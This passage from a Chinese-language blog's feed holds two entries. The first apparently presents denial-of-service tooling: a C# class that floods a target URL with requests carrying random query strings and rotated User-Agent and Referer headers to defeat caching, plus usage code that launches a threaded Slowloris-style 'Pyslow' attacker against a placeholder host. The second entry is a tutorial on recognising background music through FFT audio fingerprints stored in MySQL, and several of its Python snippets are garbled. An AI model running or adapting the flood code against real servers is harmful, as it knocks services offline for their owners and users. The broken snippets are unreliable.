class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Requester</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> tgt;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> ssl;</span><br><span class="line">    <span class="keyword">private</span> List&lt;HttpWebRequest&gt; req = <span class="keyword">new</span> List&lt;HttpWebRequest&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Requester</span>(<span class="params"><span class="built_in">string</span> tgt</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.tgt = tgt;</span><br><span class="line">        Uri url = <span class="keyword">new</span> Uri(tgt);</span><br><span class="line">        <span class="keyword">if</span> (url.Scheme == <span class="string">&quot;https&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ssl = <span class="literal">true</span>;</span><br><span class="line">            port = <span class="number">443</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ssl = <span class="literal">false</span>;</span><br><span class="line">            port = <span class="number">80</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; <span class="title">Header2</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; cachetype = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;no-store&quot;</span>, <span class="string">&quot;max-age=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;max-stale=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">100</span>).ToString(), <span class="string">&quot;min-fresh=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;notransform&quot;</span>, <span class="string">&quot;only-if-cache&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptEc = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;compress,gzip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;compress;q=0,5, gzip;q=1.0&quot;</span>, <span class="string">&quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptC = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;ISO-8859-1&quot;</span>, <span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;Windows-1251&quot;</span>, <span class="string">&quot;ISO-8859-2&quot;</span>, <span class="string">&quot;ISO-8859-15&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; bot = ds.AddBots();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> c = cachetype[random.Next(<span class="number">0</span>, cachetype.Count)];</span><br><span class="line">        <span class="built_in">string</span> a = acceptEc[random.Next(<span class="number">0</span>, acceptEc.Count)];</span><br><span class="line"></span><br><span class="line">        Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; http_header = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">        http_header.Add(<span class="string">&quot;User-Agent&quot;</span>, ds.AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)]);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Cache-Control&quot;</span>, c);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Accept-Encoding&quot;</span>, a);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Keep-Alive&quot;</span>, <span class="string">&quot;42&quot;</span>);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Host&quot;</span>, tgt);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Referer&quot;</span>, bot[random.Next(<span class="number">0</span>, bot.Count)]);</span><br><span class="line">        <span class="keyword">return</span> http_header;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebHeaderCollection <span class="title">Header</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; cachetype = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;no-store&quot;</span>, <span class="string">&quot;max-age=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;max-stale=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">100</span>).ToString(), <span class="string">&quot;min-fresh=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;notransform&quot;</span>, <span class="string">&quot;only-if-cache&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptEc = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;compress,gzip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;compress;q=0,5, gzip;q=1.0&quot;</span>, <span class="string">&quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptC = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;ISO-8859-1&quot;</span>, <span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;Windows-1251&quot;</span>, <span class="string">&quot;ISO-8859-2&quot;</span>, <span class="string">&quot;ISO-8859-15&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; bot = ds.AddBots();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> c = cachetype[random.Next(<span class="number">0</span>, cachetype.Count)];</span><br><span class="line">        <span class="built_in">string</span> a = acceptEc[random.Next(<span class="number">0</span>, acceptEc.Count)];</span><br><span class="line"></span><br><span class="line">        WebHeaderCollection http_header = <span class="keyword">new</span> WebHeaderCollection();</span><br><span class="line">        http_header.Add(<span class="string">&quot;User-Agent&quot;</span>, ds.AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)]);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Cache-Control&quot;</span>, c);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Accept-Encoding&quot;</span>, a);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Keep-Alive&quot;</span>, <span class="string">&quot;42&quot;</span>);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Host&quot;</span>, tgt);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Referer&quot;</span>, bot[random.Next(<span class="number">0</span>, bot.Count)]);</span><br><span class="line">        <span class="keyword">return</span> http_header;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">RandStr</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; mystr = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> x = <span class="number">0</span>; x &lt; <span class="number">3</span>; x++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">string</span> chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> text = <span class="keyword">new</span> <span class="built_in">string</span>(Enumerable.Repeat(chars, random.Next(<span class="number">7</span>, <span class="number">14</span>)).Select(s =&gt; s[random.Next(s.Length)]).ToArray());</span><br><span class="line">            mystr.Add(text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Join(<span class="string">&quot;&amp;&quot;</span>, mystr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">CreateUrl</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tgt + <span class="string">&quot;?&quot;</span> + RandStr();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Run</span>(<span class="params"><span class="built_in">string</span> method,<span class="built_in">int</span> count=<span class="number">1</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> _ <span class="keyword">in</span> Enumerable.Range(<span class="number">0</span>, count)) <span class="comment">// 可以根据实际需求调整循环次数等逻辑，这里简单示例先循环1次</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//string method = new string[] &#123; &quot;GET&quot;, &quot;POST&quot; &#125;[new Random().Next(0, 2)];</span></span><br><span class="line">                <span class="comment">// 先创建包含完整请求URL（包含参数等）的Uri对象</span></span><br><span class="line">                Uri requestUri = <span class="keyword">new</span> Uri(CreateUrl());</span><br><span class="line">                HttpWebRequest reqter;</span><br><span class="line">                <span class="keyword">if</span> (ssl)</span><br><span class="line">                &#123;</span><br><span class="line">                    reqter = (HttpWebRequest)WebRequest.Create(requestUri);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    reqter = (HttpWebRequest)WebRequest.Create(requestUri);</span><br><span class="line">                &#125;</span><br><span class="line">                reqter.Method = method;</span><br><span class="line">                <span class="keyword">using</span> (WebResponse response = reqter.GetResponse())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 可以在这里添加对响应内容的处理逻辑，当前为空</span></span><br><span class="line">                    Console.WriteLine(response.ContentLength.ToString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      <span class="built_in">string</span> target = <span class="string">&quot;xxx&quot;</span>;<span class="comment">// 替换为实际目标IP或域名</span></span><br><span class="line">      <span class="built_in">int</span> port = xxx;</span><br><span class="line">      <span class="built_in">float</span> timeout = <span class="number">5.0f</span>;</span><br><span class="line">      <span class="built_in">int</span> threads = <span class="number">10</span>;</span><br><span class="line">      <span class="built_in">int</span> sleepTime = <span class="number">100</span>;</span><br><span class="line">      Pyslow pyslow = <span class="keyword">new</span> Pyslow(target, port, timeout, threads, sleepTime);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">          pyslow.DoConnection();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">      &#123;</span><br><span class="line">          Console.WriteLine(<span class="string">$&quot;发生异常: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span>/ 创建Requester类的实例，传入目标URL</span></span><br><span class="line"><span class="comment">//Requester requester = new Requester(&quot;http://xxx/index.html&quot;); // http://xxx:16552</span></span><br><span class="line"><span class="comment">//try</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    // 调用Run方法来执行发送请求等相关操作</span></span><br><span class="line"><span class="comment">//    requester.Run(&quot;GET&quot;, 100);//POST</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//catch (Exception ex)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    Console.WriteLine($&quot;发生异常: &#123;ex.Message&#125;&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><!---https://learn.microsoft.com/en-us/dotnet/core/tools/global-tools-how-to-createconsole create--->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UDP-包发&quot;&gt;&lt;a href=&quot;#UDP-包发&quot; class=&quot;headerlink&quot; title=&quot;UDP 包发&quot;&gt;&lt;/a&gt;UDP 包发&lt;/h1&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="csharp" scheme="https://banjinmei.github.io/tags/csharp/"/>
    
  </entry>
  
  <entry>
    <title>听歌识曲</title>
    <link href="https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/"/>
    <id>https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/</id>
    <published>2024-12-10T14:33:56.000Z</published>
    <updated>2024-12-13T17:50:26.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="听歌识曲"><a href="#听歌识曲" class="headerlink" title="听歌识曲"></a>听歌识曲</h1><p>抖音小视频背景音乐识别</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现代语言系中语音的特征是指描述语音的核心信息，这在语音模型的构建中起重要作用。人类通过耳朵听到的特有的频率组成的序列来记忆歌曲，针对于短视频中的背景音乐，通过傅里叶变换将声音转换为频率，得到一个个数组，再由数组组合成声音指纹，从而进行音乐的识别。</p><h1 id="1-背景歌名识别产生背景"><a href="#1-背景歌名识别产生背景" class="headerlink" title="1.背景歌名识别产生背景"></a>1.背景歌名识别产生背景</h1><h2 id="解决方案-语音处理技术"><a href="#解决方案-语音处理技术" class="headerlink" title="解决方案-语音处理技术"></a>解决方案-语音处理技术</h2><p>语音信号处理(Speech Signal Processing)简称语音处理，是用以研究语音发声过程、语音信号统计特性、语音自动识别、机器合成以及语音感知等各种处理技术的总称。<br>由于现代的语音处理技术都以数字计算为基础，并借助微处理器、信号处理器或通用计算机加以实现，因此也称数字语音信号处理。</p><h1 id="2-语音处理技术概述"><a href="#2-语音处理技术概述" class="headerlink" title="2.语音处理技术概述"></a>2.语音处理技术概述</h1><h2 id="什么是语音处理"><a href="#什么是语音处理" class="headerlink" title="什么是语音处理"></a>什么是语音处理</h2><p>语音信号处理的研究起源于对发音器官的模拟。<br>1939年美国H.杜德莱(H.Dudley)展出了一个简单的发音过程模拟系统，以后发展为声道的数字模型。利用该模型可以对语音信号进行各种频谱及参数的分析，进行通信编码或数据压缩的研究，同时也可基于此合成语音信号，实现机器的语音合成。<br>语言信息主要包含在语音信号的参数之中，因此准确而迅速地提取语言信号的参数是进行语音信号处理的关键。</p><h2 id="语音处理-声纹识别"><a href="#语音处理-声纹识别" class="headerlink" title="语音处理-声纹识别"></a>语音处理-声纹识别</h2><p>声纹(Voiceprint)，也可称作说话人识别，是一种通过声音判别说话人身份的技术，声纹是携带言语信息的声波频谱，由波长、频率以及强度等多种特征维度组成的生物特征，有稳定性，可测量性以及唯一性等优点。不同的人说话所产生的声纹图谱是存在差异的，通过对比差异就可实现声纹识别的功能。</p><h2 id="声纹识别特征"><a href="#声纹识别特征" class="headerlink" title="声纹识别特征"></a>声纹识别特征</h2><p><strong>共鸣方式特征</strong><br>咽腔共鸣、鼻腔共鸣和口腔共鸣</p><p><strong>嗓音纯度特征</strong><br>不同人的噪音，纯度一般是不一样的，大致可分为高纯度(明亮)、低纯度(沙哑)和中等纯度三个等级</p><p><strong>平均音高特征</strong><br>平均音高的高低:嗓音高亢还是低沉</p><p><strong>音域特征</strong><br>音域的高低:声音饱满还是干瘪</p><h2 id="声纹识别流程"><a href="#声纹识别流程" class="headerlink" title="声纹识别流程"></a>声纹识别流程</h2><p>声纹识别作为生物识别的一种，也可称为说话人识别，从说话人发出的语音信号中提取声纹特征信息。通常具有两个阶段，即声音注册和声音验证。</p><p>声纹注册-&gt;有效语音提取-&gt;提取特征-&gt;声纹数据库<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↑ &emsp;&emsp;&emsp;│<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;提取算法&emsp;对比算法<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; &emsp;↓ &emsp;&emsp;&emsp;↓<br>声纹验证-&gt;有效语音提取-&gt;提取特征-&gt;特征对比-&gt;识别结果</p><h1 id="3-背景歌名识别所涉及相关技术"><a href="#3-背景歌名识别所涉及相关技术" class="headerlink" title="3.背景歌名识别所涉及相关技术"></a>3.背景歌名识别所涉及相关技术</h1><h2 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h2><p>声纹识别中重要的一步为特征提取，即识别音频信号，获取所需语音信息</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="1-语音信号分帧"><a href="#1-语音信号分帧" class="headerlink" title="1.语音信号分帧"></a>1.语音信号分帧</h4><p>音频信号不断变化，为了简化处理步骤，将音频信号分帧处理(常分为20~40ms帧)确保每帧的音频信号变化稳定</p><h4 id="2-对每帧做傅里叶变换"><a href="#2-对每帧做傅里叶变换" class="headerlink" title="2.对每帧做傅里叶变换"></a>2.对每帧做傅里叶变换</h4><p>傅里叶变换适用于分心平稳的音频信号，傅里叶变换对针对每一帧音频信号进行处理，只记录不接近于零的频域信息，从而减少数据量</p><p><strong>时域</strong><br>描述数学函数或物理信号对时间的关系，通常呈现为波形<br><strong>频域</strong><br>在对函数或信号进行分析时，分析其和频率有关的部分，而不是和时间的有关部分，与时域相对，通常呈现为频谱</p><h2 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h2><p>傅里叶变换:作为一种线性积分变换，可用于音频信号在时域和频域之间的转换。其实质为:将时域信号变换为频域信号，将繁杂的数据简化，仅需要对少部分数据进行处理。(也就是说，我们在对信号做傅里叶变换时，只需要记录其中不接近零的频域信息即可，这样做就使得数据量大大减少)<br>针对音频数据进行傅里叶变换后，对数据进行求模，得到多组数组，对数组进行整合(例:将四个数组中模长最长的下标进行合并，合成一个四元组)，从而获得核心的音频“指纹”。</p><p>匹配声纹数据库<br>在对声音进行注册后，通过提取语音特征，获得声纹导入数据库中建立对应的声纹数据库当获取到语音文件之后，通过预处理获取到语音特征，经过与声纹数据进行特征对比，从而得到最佳的识别结果。</p><h2 id="声纹识别应用"><a href="#声纹识别应用" class="headerlink" title="声纹识别应用"></a>声纹识别应用</h2><p><strong>安防</strong><br>作为生物特征识别技术，可以用于刑侦、鉴定识别等领域<br><strong>金融</strong><br>通过声纹技术提供用户注册、用户验证等功能<br><strong>社保</strong><br>通过声纹技术对用户进行身份认证，确保参保人员生存状况<br><strong>智能硬件</strong><br>通过声纹识别技术，实现“听声识人”，让智能硬件能够区分不同的角色</p><h1 id="4-背景歌名识别实践"><a href="#4-背景歌名识别实践" class="headerlink" title="4. 背景歌名识别实践"></a>4. 背景歌名识别实践</h1><h2 id="歌名识别-架构"><a href="#歌名识别-架构" class="headerlink" title="歌名识别 架构"></a>歌名识别 架构</h2><p>python + 云数据库RDS</p><h2 id="py3"><a href="#py3" class="headerlink" title="py3"></a>py3</h2><p>Pymysql (py2 mysqldb)<br>Moviepy 转音频<br>PyAudio 语音操作</p><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><p>系型数据库(Relational Database Service，简称RDS)是一种基于云计算平台的即开即用、稳定可靠、弹性伸缩、便捷管理的在线关系型数据库服务。</p><p>云关系型数据库可支持以下几类数据库引擎:<br>MySQL，PostgreSQL，SQL Server，GaussDB(openGauss)<br>特点优势</p><p>开箱即用，按需付费，可视管理，弹性伸缩</p><h2 id="建立声纹数据库"><a href="#建立声纹数据库" class="headerlink" title="建立声纹数据库"></a>建立声纹数据库</h2><p>存储海量声纹数据，建立声纹数据库通过与Python连接，在Python通过组件及代码获取到可用于存储的声纹特征之后，存入数据库RDS对应新建库singdb中</p><p>作为声纹数据库，进行声纹特征匹配，<br>从而实现歌名识别在Python获取到用户所需对比识别的短视频后，通过提取对应声纹特征，与声纹数据库中的声纹特征进行对比，从而获取到对应的歌曲名称，实现背景歌名识别</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>配置数据库-&gt;安装py-anaconda下载组件-&gt;关联数据库和py-&gt;验证结果</p><p>新建数据库<br>singdb<br>utf8mb4</p><p>song_name varchar200<br>fq longtext</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pymysql</span><br><span class="line">pip install -user moviepy -i http://pypi.douban.com/simple --trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><h3 id="视频转音频"><a href="#视频转音频" class="headerlink" title="视频转音频"></a>视频转音频</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moviepy.editor <span class="keyword">import</span></span><br><span class="line">video=VideoFileClip(<span class="string">&#x27;示例1.mp4&#x27;</span>)</span><br><span class="line">audio = video.audio</span><br><span class="line">audio.write audiofile(<span class="string">&#x27;示例1.wav&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sss=memory(<span class="string">&quot;弹性公网IP&#x27;,3306,&#x27;root&quot;</span>,<span class="string">&#x27;自行设置的密码’,&#x27;</span>singd<span class="string">b&#x27;)</span></span><br><span class="line"><span class="string">res=sss.search and play(&#x27;</span>示例<span class="number">1.</span>wav<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">score=max(res)</span></span><br><span class="line"><span class="string">if score[0]&lt;1000:</span></span><br><span class="line"><span class="string">print(“没有找到&quot;”)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">print(&quot;歌曲名称:&quot;,score[1])</span></span><br></pre></td></tr></table></figure><p>通过Python的相关代码对短视频进行视音分离并建立声音<strong>指纹</strong>数据库，通过短视频背景音乐与声学模型进行匹配，从而获取到背景歌名。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>语音处理的基础知识及应用<br>语音处理的基本步骤<br>熟悉声纹识别的部署方式及整体流程</p><h1 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h1><p>Python需通过弹性公网IP与云数据库RDS进行连接。<br>ture<br>声纹识别<br>稳定性 可测量性 唯一性<br>特征提取<br>对音频信号做分帧处理<br>20~40ms帧</p><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>数据库名称：singdb（可自定义）字符集：utf8mb4<br>表名：fingerprint（可自定义）存储引擎：InnoDB字符集：utf8mb4校验规则：utf8mb4_general_ci</p><p>Pycharm<br>提取需存储在数据库中供检索识别的音频文件的特征信息（音频处理的类有三种方法：载入数据、傅里叶变换、播放音乐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pyaudio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">voice</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loaddata</span>(<span class="params">self, filepath</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(filepath) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError</span><br><span class="line">        p1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;\.wav&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> p1.findall(filepath) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = wave.<span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">            params = f.getparams()</span><br><span class="line">            self.nchannels, self.sampwidth, self.framerate, self.nframes = params[:<span class="number">4</span>]</span><br><span class="line">            str_data = f.readframes(self.nframes)</span><br><span class="line">            <span class="comment">#self.wave_data = np.fromstring(str_data, dtype=np.short)</span></span><br><span class="line">            self.wave_data = np.frombuffer(str_data, dtype=np.short)</span><br><span class="line">            self.wave_data.shape = -<span class="number">1</span>, self.sampwidth</span><br><span class="line">            self.wave_data = self.wave_data.T</span><br><span class="line">            f.close()</span><br><span class="line">            self.name = os.path.basename(filepath)  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fft</span>(<span class="params">self, frames=<span class="number">40</span></span>):</span><br><span class="line">        block = []</span><br><span class="line">        fft_blocks = []</span><br><span class="line">        self.high_point = []</span><br><span class="line">        blocks_size = self.framerate // frames  </span><br><span class="line">        blocks_num = self.nframes / blocks_size  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(self.wave_data[<span class="number">0</span>]) - blocks_size, blocks_size):</span><br><span class="line">            block.append(self.wave_data[<span class="number">0</span>][i:i + blocks_size])</span><br><span class="line">            fft_blocks.append(np.<span class="built_in">abs</span>(np.fft.fft(self.wave_data[<span class="number">0</span>][i:i + blocks_size])))</span><br><span class="line">            self.high_point.append((np.argmax(fft_blocks[-<span class="number">1</span>][:<span class="number">40</span>]),</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span class="number">40</span>:<span class="number">80</span>]) + <span class="number">40</span>,</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span class="number">80</span>:<span class="number">120</span>]) + <span class="number">80</span>,</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span 